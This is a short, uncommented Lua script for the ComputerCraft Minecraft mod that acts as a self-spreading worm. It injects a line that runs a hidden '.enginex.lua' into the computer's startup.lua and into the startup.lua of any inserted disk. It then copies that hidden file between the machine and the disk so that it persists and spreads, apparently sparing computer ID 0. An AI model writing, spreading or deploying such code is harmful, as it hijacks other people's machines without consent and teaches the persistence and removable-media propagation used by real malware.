if os.getComputerID() == 0 then
    return
end

local function injectStartup(path)
--[[    if not fs.exists(path) then
        return false
    end
]] 
    local f = fs.open(path, "r")
    local content = f and f.readAll() or ""
    if f then f.close() end
    
    local inject = "shell.run('.enginex.lua')"
    
    if not content:find(inject, 1, true) then
        f = fs.open(path, "w")
        if content ~= "" and not content:match("\n$") then
            content = content .. "\n"
        end
        f.write(content .. inject .. "\n")
        f.close()
        return true
    end
    return false
end

injectStartup("startup.lua")

local drive = peripheral.find("drive")
if drive.isDiskPresent() then injectStartup(drive.getMountPath() .. "/startup.lua") end

if drive.isDiskPresent() and fs.exists("/.enginex.lua") and not fs.exists(drive.getMountPath() .. "/.enginex.lua") then
    fs.copy("/.enginex.lua", drive.getMountPath() .. "/.enginex.lua")
elseif drive.isDiskPresent() and fs.exists(drive.getMountPath() .. "/.enginex.lua") and not fs.exists("/.enginex.lua") then
    fs.copy(drive.getMountPath() .. "/.enginex.lua", "/.enginex.lua")
end